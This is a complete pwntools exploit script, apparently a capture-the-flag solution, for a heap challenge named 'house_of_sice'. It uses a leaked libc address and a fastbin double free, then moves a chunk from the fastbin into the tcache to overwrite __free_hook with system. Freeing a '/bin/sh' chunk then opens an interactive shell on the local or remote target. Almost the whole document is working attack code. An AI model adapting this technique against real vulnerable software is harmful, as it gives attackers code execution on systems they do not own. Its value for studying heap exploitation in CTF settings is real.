from pwn import *

context.binary = elf = ELF('./house_of_sice')

if args.REMOTE:
    s = remote('house-of-sice.hsc.tf', 1337)
else:
    s = process(elf.path)

s.recvuntil('deet: ')
system = int(s.recvline()[:-1], 16)
libc = elf.libc
libc.address = system - libc.symbols.system
print(hex(libc.address))

idx = -1
def malloc(data):
    global idx
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(data))
    idx += 1
    return idx

def calloc(data):
    global idx
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', '2')
    s.sendlineafter('> ', str(data))
    idx += 1
    return idx

def sell(idx):
    s.sendlineafter('> ', '2')
    s.sendlineafter('> ', str(idx))

for i in range(7):
    malloc(0xdeadbeef)

a = malloc(0xdeadbeef)
b = malloc(0xdeadbeef)

for i in range(7):
    sell(i)

sell(a) # fastbin -> a -> ?
sell(b) # fastbin -> b -> a -> ?
sell(a) # fastbin -> a -> b -> a -> b -> ...

malloc(0xdeadbeef)
malloc(0xdeadbeef)

# fastbin -> b -> a -> __free_hook
# ↓
# tcache -> a -> __free_hook
calloc(libc.symbols.__free_hook)

# tcache -> __free_hook
binsh = malloc(u64(b'/bin/sh\00'))

# fastbin ->  __free_hook
malloc(libc.symbols.system)

sell(binsh)

s.interactive()
